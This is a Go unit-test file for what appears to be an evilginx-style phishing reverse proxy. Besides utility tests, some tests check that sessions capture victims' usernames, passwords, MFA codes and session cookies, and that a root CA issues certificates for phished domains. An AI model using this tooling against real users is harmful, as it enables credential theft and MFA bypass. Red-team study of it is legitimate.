package core

import (
	"path/filepath"
	"testing"
	"time"

	"github.com/s4l1hs/olta/pkg/proxy/database"
)

// TestBanner_DoesNotPanic guards a real boot crash: printOneliner1 pads with
// strings.Repeat(" ", 10-len(VERSION)), and VERSION grew from "3.2.0" (5
// chars) to "1.0.0-Alpha" (11 chars). Without the clamp in printOneliner1,
// 10-11 = -1 makes strings.Repeat panic before the proxy ever starts.
func TestBanner_DoesNotPanic(t *testing.T) {
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("Banner() panicked: %v", r)
		}
	}()
	Banner()
}

func TestCombineHost(t *testing.T) {
	cases := []struct {
		name   string
		sub    string
		domain string
		want   string
	}{
		{"empty sub", "", "example.com", "example.com"},
		{"with sub", "www", "example.com", "www.example.com"},
		{"nested sub", "a.b", "example.com", "a.b.example.com"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := combineHost(tc.sub, tc.domain); got != tc.want {
				t.Errorf("combineHost(%q, %q) = %q, want %q", tc.sub, tc.domain, got, tc.want)
			}
		})
	}
}

func TestObfuscateAndRemoveObfuscatedDots(t *testing.T) {
	cases := []struct {
		name  string
		input string
	}{
		{"no dots", "example"},
		{"one dot", "example.com"},
		{"many dots", "a.b.c.example.com"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			obfuscated := obfuscateDots(tc.input)
			if got := removeObfuscatedDots(obfuscated); got != tc.input {
				t.Errorf("round trip = %q, want %q", got, tc.input)
			}
		})
	}
}

func TestStringExists(t *testing.T) {
	haystack := []string{"a", "b", "c"}
	cases := []struct {
		name string
		s    string
		want bool
	}{
		{"present", "b", true},
		{"absent", "z", false},
		{"empty", "", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := stringExists(tc.s, haystack); got != tc.want {
				t.Errorf("stringExists(%q, %v) = %v, want %v", tc.s, haystack, got, tc.want)
			}
		})
	}
}

func TestIntExists(t *testing.T) {
	haystack := []int{1, 2, 3}
	cases := []struct {
		name string
		i    int
		want bool
	}{
		{"present", 2, true},
		{"absent", 9, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := intExists(tc.i, haystack); got != tc.want {
				t.Errorf("intExists(%d, %v) = %v, want %v", tc.i, haystack, got, tc.want)
			}
		})
	}
}

func TestRemoveString(t *testing.T) {
	cases := []struct {
		name  string
		input []string
		s     string
		want  []string
	}{
		{"present in middle", []string{"a", "b", "c"}, "b", []string{"a", "c"}},
		{"absent", []string{"a", "b"}, "z", []string{"a", "b"}},
		{"first element", []string{"a", "b"}, "a", []string{"b"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			input := append([]string(nil), tc.input...)
			got := removeString(tc.s, input)
			if len(got) != len(tc.want) {
				t.Fatalf("removeString(%q, %v) = %v, want %v", tc.s, tc.input, got, tc.want)
			}
			for i := range got {
				if got[i] != tc.want[i] {
					t.Errorf("removeString(%q, %v) = %v, want %v", tc.s, tc.input, got, tc.want)
				}
			}
		})
	}
}

func TestTruncateString(t *testing.T) {
	cases := []struct {
		name   string
		s      string
		maxLen int
		want   string
	}{
		{"shorter than max", "hello", 10, "hello"},
		{"exact length", "hello", 5, "hello"},
		{"needs truncation", "abcdefghijklmnopqrstuvwxyz", 10, "abcd...xyz"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := truncateString(tc.s, tc.maxLen); got != tc.want {
				t.Errorf("truncateString(%q, %d) = %q, want %q", tc.s, tc.maxLen, got, tc.want)
			}
		})
	}
}

func TestGenRandomString(t *testing.T) {
	cases := []int{0, 1, 8, 32}
	for _, n := range cases {
		s := GenRandomString(n)
		if len(s) != n {
			t.Errorf("GenRandomString(%d) length = %d, want %d", n, len(s), n)
		}
	}
}

func TestGenRandomAlphanumString(t *testing.T) {
	s := GenRandomAlphanumString(16)
	if len(s) != 16 {
		t.Fatalf("GenRandomAlphanumString(16) length = %d, want 16", len(s))
	}
}

func TestGenRandomToken(t *testing.T) {
	a := GenRandomToken()
	b := GenRandomToken()
	if a == "" {
		t.Fatal("GenRandomToken() returned empty string")
	}
	if a == b {
		t.Fatal("GenRandomToken() returned the same token twice in a row")
	}
}

func TestGetContentType(t *testing.T) {
	cases := []struct {
		name string
		path string
		data []byte
		want string
	}{
		{"css extension", "/style.css", []byte("body{}"), "text/css"},
		{"js extension", "/app.js", []byte("var x=1;"), "application/javascript"},
		{"svg extension", "/logo.svg", []byte("<svg></svg>"), "image/svg+xml"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := getContentType(tc.path, tc.data); got != tc.want {
				t.Errorf("getContentType(%q, ...) = %q, want %q", tc.path, got, tc.want)
			}
		})
	}
}

func TestGetSessionCookieName(t *testing.T) {
	a := getSessionCookieName("phishlet-a", "cookiename")
	b := getSessionCookieName("phishlet-b", "cookiename")
	if a == b {
		t.Fatal("different phishlet names produced the same cookie name")
	}
	// Deterministic: same inputs must produce the same output every time.
	if got := getSessionCookieName("phishlet-a", "cookiename"); got != a {
		t.Errorf("getSessionCookieName is not deterministic: got %q, want %q", got, a)
	}
	if len(a) != 9 || a[4] != '-' {
		t.Errorf("getSessionCookieName(%q) = %q, want 9 chars with '-' at index 4", "phishlet-a", a)
	}
}

func TestParseDurationString(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		want    time.Duration
		wantErr bool
	}{
		{"seconds only", "30s", 30 * time.Second, false},
		{"minutes and seconds", "5m30s", 5*time.Minute + 30*time.Second, false},
		{"days hours minutes seconds", "1d2h3m4s", 24*time.Hour + 2*time.Hour + 3*time.Minute + 4*time.Second, false},
		{"empty string", "", 0, false},
		{"out of order", "1s1d", 0, true},
		{"unknown unit", "5x", 0, true},
		// A trailing number with no unit suffix is silently dropped by the
		// parser rather than rejected - this pins that (surprising but
		// existing) behavior rather than changing it.
		{"value without unit is silently dropped", "5", 0, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := ParseDurationString(tc.input)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("ParseDurationString(%q) expected an error, got nil", tc.input)
				}
				return
			}
			if err != nil {
				t.Fatalf("ParseDurationString(%q) unexpected error: %v", tc.input, err)
			}
			if got != tc.want {
				t.Errorf("ParseDurationString(%q) = %v, want %v", tc.input, got, tc.want)
			}
		})
	}
}

func TestGetDurationString(t *testing.T) {
	now := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
	cases := []struct {
		name   string
		expire time.Time
		want   string
	}{
		{"already expired", now.Add(-time.Minute), ""},
		{"exactly now", now, ""},
		{"thirty seconds", now.Add(30 * time.Second), "30s"},
		{"one day one hour", now.Add(25 * time.Hour), "1d1h0m0s"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := GetDurationString(now, tc.expire); got != tc.want {
				t.Errorf("GetDurationString(now, %v) = %q, want %q", tc.expire, got, tc.want)
			}
		})
	}
}

func TestNewSession(t *testing.T) {
	s, err := NewSession("my-phishlet")
	if err != nil {
		t.Fatalf("NewSession() error: %v", err)
	}
	if s.Id == "" {
		t.Error("Id was not populated")
	}
	if s.Name != "my-phishlet" {
		t.Errorf("Name = %q, want %q", s.Name, "my-phishlet")
	}
	if s.Custom == nil || s.Params == nil || s.BodyTokens == nil || s.HttpTokens == nil || s.CookieTokens == nil {
		t.Error("NewSession left a map field nil")
	}
	if s.DoneSignal == nil {
		t.Error("DoneSignal was not initialized")
	}
	if s.IsDone {
		t.Error("a fresh session must not be done")
	}
}

func TestSession_SetUsernamePasswordCustom(t *testing.T) {
	s, err := NewSession("p")
	if err != nil {
		t.Fatal(err)
	}
	s.SetUsername("alice")
	s.SetPassword("hunter2")
	s.SetCustom("mfa_code", "123456")

	if s.Username != "alice" {
		t.Errorf("Username = %q, want alice", s.Username)
	}
	if s.Password != "hunter2" {
		t.Errorf("Password = %q, want hunter2", s.Password)
	}
	if s.Custom["mfa_code"] != "123456" {
		t.Errorf("Custom[mfa_code] = %q, want 123456", s.Custom["mfa_code"])
	}
}

func TestSession_Finish(t *testing.T) {
	s, err := NewSession("p")
	if err != nil {
		t.Fatal(err)
	}
	done := s.DoneSignal
	s.Finish(true)
	if !s.IsDone {
		t.Fatal("IsDone was not set")
	}
	if !s.IsAuthUrl {
		t.Fatal("IsAuthUrl was not set")
	}
	select {
	case <-done:
	default:
		t.Fatal("DoneSignal channel was not closed")
	}
	if s.DoneSignal != nil {
		t.Fatal("DoneSignal was not cleared")
	}

	// Finish is idempotent: calling it again must not panic on the
	// already-nil DoneSignal or flip IsAuthUrl back to false.
	s.Finish(false)
	if !s.IsAuthUrl {
		t.Fatal("a second Finish() call must not change IsAuthUrl")
	}
}

func TestSession_AllCookieAuthTokensCaptured(t *testing.T) {
	s, err := NewSession("p")
	if err != nil {
		t.Fatal(err)
	}
	required := map[string][]*CookieAuthToken{
		".example.com": {{domain: ".example.com", name: "session"}},
	}
	if s.AllCookieAuthTokensCaptured(required) {
		t.Fatal("no cookies captured yet, expected false")
	}
	s.AddCookieAuthToken(".example.com", "session", "abc123", "/", true, time.Time{})
	if !s.AllCookieAuthTokensCaptured(required) {
		t.Fatal("required cookie was captured, expected true")
	}
}

func TestNewBlacklist_LoadsIPsAndCIDRs(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "blacklist.txt")
	content := "; comment line\n1.2.3.4\n10.0.0.0/8\n\n"
	if err := SaveToFile([]byte(content), path, 0600); err != nil {
		t.Fatal(err)
	}

	bl, err := NewBlacklist(path, nil)
	if err != nil {
		t.Fatalf("NewBlacklist() error: %v", err)
	}
	ips, masks := bl.GetStats()
	if ips != 1 || masks != 1 {
		t.Fatalf("GetStats() = (%d, %d), want (1, 1)", ips, masks)
	}
	if !bl.IsBlacklisted("1.2.3.4") {
		t.Error("1.2.3.4 should be blacklisted (exact match)")
	}
	if !bl.IsBlacklisted("10.1.2.3") {
		t.Error("10.1.2.3 should be blacklisted (CIDR match)")
	}
	if bl.IsBlacklisted("8.8.8.8") {
		t.Error("8.8.8.8 should not be blacklisted")
	}
}

func TestBlacklist_AddIP(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "blacklist.txt")
	if err := SaveToFile(nil, path, 0600); err != nil {
		t.Fatal(err)
	}
	bl, err := NewBlacklist(path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if bl.IsBlacklisted("203.0.113.1") {
		t.Fatal("IP should not be blacklisted before AddIP")
	}
	if err := bl.AddIP("203.0.113.1"); err != nil {
		t.Fatalf("AddIP() error: %v", err)
	}
	if !bl.IsBlacklisted("203.0.113.1") {
		t.Fatal("IP should be blacklisted after AddIP")
	}
	if err := bl.AddIP("not-an-ip"); err == nil {
		t.Fatal("AddIP() with an invalid address should error")
	}
}

func TestBlacklist_IsWhitelisted(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "blacklist.txt")
	if err := SaveToFile(nil, path, 0600); err != nil {
		t.Fatal(err)
	}
	bl, err := NewBlacklist(path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !bl.IsWhitelisted("127.0.0.1") {
		t.Error("127.0.0.1 must always be whitelisted")
	}
	if bl.IsWhitelisted("203.0.113.1") {
		t.Error("an arbitrary IP must not be whitelisted")
	}
}

// newTestDatabase opens a Database backed by t.TempDir() so tests never touch
// a shared path or leave state behind.
func newTestDatabase(t *testing.T) *database.Database {
	t.Helper()
	path := filepath.Join(t.TempDir(), "olta-test.db")
	db, err := database.NewDatabase(path)
	if err != nil {
		t.Fatalf("database.NewDatabase() error: %v", err)
	}
	t.Cleanup(func() {
		_ = db.Close()
	})
	return db
}

func TestNewCertDb_CreatesRootCA(t *testing.T) {
	dir := t.TempDir()
	cfg, err := NewConfig(dir, "")
	if err != nil {
		t.Fatalf("NewConfig() error: %v", err)
	}
	certDb, err := NewCertDb(filepath.Join(dir, "crt"), cfg, nil)
	if err != nil {
		t.Fatalf("NewCertDb() error: %v", err)
	}
	if certDb.caCert.Certificate == nil {
		t.Fatal("root CA certificate was not generated")
	}
	if _, err := certDb.getSelfSignedCertificate("phished.example", "", 443); err != nil {
		t.Fatalf("getSelfSignedCertificate() error: %v", err)
	}
}
